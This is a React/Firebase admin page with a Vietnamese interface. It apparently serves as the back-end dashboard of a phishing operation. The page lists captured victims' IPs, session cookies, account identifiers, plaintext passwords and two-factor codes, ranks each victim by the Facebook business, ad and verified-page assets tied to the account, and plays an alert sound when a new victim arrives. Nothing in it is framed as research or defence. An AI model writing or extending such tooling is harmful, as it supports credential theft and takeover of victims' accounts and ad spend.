import React, { useState, useEffect, useRef } from "react";
import {
  collection,
  deleteDoc,
  doc,
  getDocs,
  onSnapshot,
  orderBy,
  query,
  where
} from "firebase/firestore";
import { db } from "../../firebase";
import moment from 'moment';
import { UserOutlined } from "@ant-design/icons";
import { Button, DatePicker, Form, Input, Pagination } from "antd";
const { RangePicker } = DatePicker;
import elephent from '../../assets/elephant.png';
import fanpage from '../../assets/fanpage.png';
import ads from '../../assets/ads.png';
import business from '../../assets/business.png';
import verified from '../../assets/verified.png';
import shield from '../../assets/shield.png';

const AdminPage = () => {
  const [users, setUsers] = useState([]);
  const [totalRecord, setTotalRecords] = useState(1);
  const [currentPage, setCurrentPage] = useState(1);
  const [pageSize, setPageSize] = useState(20);
  const usersRef = collection(db, "usersdata");
  const q = query(usersRef, orderBy("createdAt", "desc"));
  const audioRef = useRef(null);
  const [isSwitchOn, setIsSwitchOn] = useState(false);
  const [reload, setReload] = useState(false);
  const [filter, setFilter] = useState({});

  const isFirstRender = useRef(true);

  useEffect(() => {
      isFirstRender.current = false;
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const snapshot = await onSnapshot(q, (querySnapshot) => {
          const userList = querySnapshot.docs.map((doc) => ({
            userID: doc.id,
            ...doc.data(),
          }));

          const changes = querySnapshot.docChanges();
          if (changes.length > 0 && changes[0]?.type === "added") {
            const audio = audioRef.current;
            const isMuted = localStorage.getItem("isMuted");
            // Check if the audio element exists and is paused
            if (audio && audio.paused && isMuted !== "true") {
                audio.play().catch((error) => {
                  //console.log("Failed to play audio:", error);
                });
            }
          }
          const offset = (currentPage - 1) * pageSize;
          const usersPerPage = userList.slice(offset, offset + pageSize);
          setUsers(usersPerPage);
          setTotalRecords(userList.length);
          setCurrentPage(1);
          setReload((prev) => !prev);
        });

        return snapshot;
      } catch (error) {
        console.error("Error fetching data from Firestore: ", error);
      }
    };

    // Fetch initial data
    fetchData();
  }, []);

  useEffect(() => {
    const isMuted = localStorage.getItem("isMuted");
    setIsSwitchOn(isMuted === "true");
  }, []);

  const toggleSwitch = (e) => {
    setIsSwitchOn(e.target.checked);
    localStorage.setItem("isMuted", e.target.checked);
  };

  const filteredUsers = (userList) => {
    const { "range-time": dateRange, findkey } = filter;

    return userList.filter((user) => {
      if (findkey && (!user.email.toLowerCase().includes(findkey.trim().toLowerCase()) && !user.phone.toLowerCase().includes(findkey.trim().toLowerCase()))) {
        return false;
      }

      if (dateRange) {
        const userDate = moment(user.createdAt);
        const startDate = moment(dateRange[0], "YYYY-MM-DD");
        const endDate = moment(dateRange[1], "YYYY-MM-DD");

        console.log(startDate)
        console.log(endDate)
        if (!userDate.isBetween(startDate, endDate, null, "[]")) {
          return false;
        }
      }

      return true;
    });
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        const querySnapshot = await getDocs(q);
        let userList = querySnapshot.docs.map((doc) => ({
          userID: doc.id,
          ...doc.data(),
        }));

        userList = filteredUsers(userList);

        const offset = (currentPage - 1) * pageSize;
        const usersPerPage = userList.slice(offset, offset + pageSize);

        setUsers(usersPerPage);
        setTotalRecords(userList.length);
      } catch (error) {
        console.error("Error fetching data from Firestore: ", error);
      }
    };

    fetchData();
  }, [currentPage, reload]);


  const handlePageChange = (page) => {
    setCurrentPage(page);
  };


  const handleDelete = async (userID) => {
    try {
     // alert('chức năng tạm đóng');
      //Tạo một reference đến tài khoản bạn muốn xóa
      const userRef = doc(db, "usersdata", userID); // Đây giả định rằng ID của người dùng được sử dụng làm ID của tài khoản
      // Gọi hàm xóa dựa trên reference
      await deleteDoc(userRef);
      setReload((prevState) => !prevState);
      console.log(`Xóa người dùng có ID: ${userID} thành công.`);
    } catch (error) {
      console.error(`Lỗi xóa người dùng có ID: ${userID}:`, error);
    }
  };

  
  const onFinish = (fieldsValue) => {
    let findkey = fieldsValue["txt-search-key"];
    const values = {
      findkey
    };
    const rangeTimeValue = fieldsValue["range-time"];
    if (rangeTimeValue) {
      values["range-time"] = [
        rangeTimeValue[0].format("YYYY-MM-DD HH:mm:ss"),
        rangeTimeValue[1].format("YYYY-MM-DD HH:mm:ss"),
      ];
    }
    setFilter(values);
    setCurrentPage(1);
    setReload((prv) => !prv);
  };
  

  return (
    <div className="container mx-auto mt-8">
      <audio ref={audioRef} src="/music/tigitig.mp3"></audio>
      <h1 className="text-2xl font-bold mb-4">Danh sách người dùng</h1>
      <div className="w-full flex items-center mt-2 mb-2 gap-3">
        <div className="w-[300px] flex items-center mt-2 mb-2 gap-3">
      <label className="relative inline-flex items-center cursor-pointer mb-3">
        <input
          onChange={toggleSwitch}
          type="checkbox"
          checked={isSwitchOn}
          className="sr-only peer"
        />
        <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 dark:peer-focus:ring-blue-800 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-blue-600"></div>
        <span className="ml-3 text-sm font-medium text-gray-900 dark:text-gray-300">
          Tắt tiếng
        </span>
      </label>
      </div>
      <div className="w-full flex-1 flex items-center mt-2 mb-2 gap-3">
          <Form
            name="time_related_controls"
            onFinish={onFinish}
            style={{ maxWidth: 600 }}
            layout="inline"
            className="min-w-full"
          >
            <Form.Item name="txt-search-key" label="Email/Sđt">
              <Input
                allowClear
                prefix={<UserOutlined className="site-form-item-icon" />}
                placeholder="Email hoặc SĐT"
              />
            </Form.Item>
            <Form.Item name="range-time" label="Ngày">
              <RangePicker format="DD-MM-YYYY" />
            </Form.Item>
            <Form.Item
              wrapperCol={{
                xs: { span: 24, offset: 0 },
                sm: { span: 16, offset: 8 },
              }}
            >
              <Button type="primary" htmlType="submit" className="bg-blue-600">
                Tìm kiếm
              </Button>
            </Form.Item>
          </Form>
        </div>
      </div>
      <div className="table-responsive">
      <table className="w-full border-collapse border border-gray-300">
        <thead>
          <tr>
            <th className="py-2 px-4 bg-gray-200">createdAt</th>
            <th className="py-2 px-4 bg-gray-200">IP</th>
            <th className="py-2 px-4 bg-gray-200">Cookie</th>
            <th style={{ minWidth: 200 }} className="py-2 px-4 bg-gray-200">
                Check Result
            </th>
            <th className="py-2 px-4 bg-gray-200">Acc Info</th>
            <th className="py-2 px-4 bg-gray-200">Password</th>
            <th className="py-2 px-4 bg-gray-200">Auth Code</th>
            <th className="py-2 px-4 bg-gray-200" style={{ width: 500 }}>
            Hành động
            </th>
          </tr>
        </thead>
        <tbody>
          {users.map((user) => (
            <tr key={user.userID}>
              <td className="py-2 px-4 border border-gray-300">
                {moment(new Date(user.createdAt)).format("yyyy-MM-DD HH:mm:ss")}
              </td>
              <td style={{ maxWidth: '300px',overflow:'scroll' }} className="py-2 px-4 border border-gray-300">
              {user.ip}
              </td>
              <td onClick={() => navigator.clipboard.writeText(user.cookie)} className="py-2 px-4 border border-gray-300">
                <textarea className="border border-success rounded" defaultValue = {user.cookie} style={{ minWidth: '300px' }}></textarea>
              </td>
              <td className="py-2 px-4 border border-gray-300">
              <table>
                <tbody>
                        <tr>
                          <td><a onClick={() => navigator.clipboard.writeText(JSON.stringify(user.bmJson))} href="#"><img alt="alternative text" title="SL tài khoản BM" style={{marginRight:5,marginLeft:5}} src={business} width="20" height="20" /></a></td>
                          <td>{JSON.stringify(user.bmJson.length)}</td>
                          <td><a onClick={() => navigator.clipboard.writeText(JSON.stringify(user.adJson))} href="#"><img alt="alternative text" title="SL TKQC Cá nhân" style={{marginRight:5,marginLeft:5}} src={ads} width="20" height="20" /></a></td>
                          <td>{JSON.stringify(user.adJson.length)}</td>
                          <td><a onClick={() => navigator.clipboard.writeText(JSON.stringify(user.pgJson))} href="#"><img alt="alternative text" title="Tổng số Page" style={{marginRight:5,marginLeft:5}} src={fanpage} width="20" height="20" /></a></td>
                          <td>{JSON.stringify(user.pgJson.length)}</td>
                        </tr>

                        <tr>
                          <td><a onClick={() => navigator.clipboard.writeText(JSON.stringify(user.pgJson))} href="#"><img alt="alternative text" title="Số Page Tick Xanh" style={{marginRight:5,marginLeft:5}} src={verified} width="20" height="20" /></a></td>
                          <td>
                          {
                          (() => {
                          if(user.pgJson){
                            var json = JSON.stringify(user.pgJson).toLowerCase();
                            if(json){
                              return json.match(new RegExp("blue_verified", "g")) ? json.match(new RegExp("blue_verified", "g")).length : 0;
                            }else{
                              return 0;
                            }
                          }else{
                            return 0;
                          }
                          })()}
                          </td>
                          <td><a onClick={() => navigator.clipboard.writeText(JSON.stringify(user.pgJson))} href="#"><img alt="alternative text" title="Số tkqc invoice" style={{marginRight:5,marginLeft:5}} src={elephent} width="20" height="20" /></a></td>
                          <td>  
                          {
                          (() => {
                          if(user.bmJson){
                            var json = JSON.stringify(user.bmJson);
                            if(json){
                              return (json.match(new RegExp('"type":4', "g")) || []).length + (json.match(new RegExp("line", "g")) || []).length;
                            }else{
                              return 0;
                            }
                          }else{
                            return 0;
                          }
                          })()} </td>
                          <td><a onClick={() => navigator.clipboard.writeText(JSON.stringify(user.auJson))} href="#"><img alt="alternative text" title="Phương thức xác thực 2 yếu tố" style={{marginRight:5,marginLeft:5}} src={shield} width="20" height="20" /></a></td>
                          <td>{JSON.stringify((Object.keys(user.auJson).length))}</td>
                        </tr>
                        </tbody>
              </table>
              </td>
              <td onClick={() => navigator.clipboard.writeText(user.account)} className="py-2 px-4 border border-gray-300">
              {
                (() => {
                var retStr = "";

                if(user.acJson){
                  retStr += Object.values(user.acJson).sort((a, b) => a.length - b.length).join(' | ');
                }else{
                  retStr += `${user.account}`;
                }
                return `${retStr}`;
                })()
              }
              </td>
              <td onClick={() => navigator.clipboard.writeText(user.pass)} className="py-2 px-4 border border-gray-300">{user.pass}</td>
              <td onClick={() => navigator.clipboard.writeText(user.aucode)} className="py-2 px-4 border border-gray-300">
                  <textarea className="border border-success rounded" defaultValue = {user.aucode} style={{ minWidth: '100px' }}></textarea>
              </td>
              <td className="py-2 px-4 flex flex-wrap gap-3">
                <button
                  style={{height:"50%"}}
                  className="w-[100px] btn btn-sm mb-2 btn-danger"
                  onClick={() => handleDelete(user.userID)}
                >
                  Xóa
                </button>        
              </td>
            </tr>
          ))}
        </tbody>
      </table>
      </div>
      <div className="mt-4 flex space-x-2 justify-center">
        <Pagination
          showQuickJumper
          current={currentPage}
          pageSize={pageSize}
          defaultCurrent={1}
          total={totalRecord}
          onChange={handlePageChange}
        />
      </div>
    </div>
  );
};

export default AdminPage;
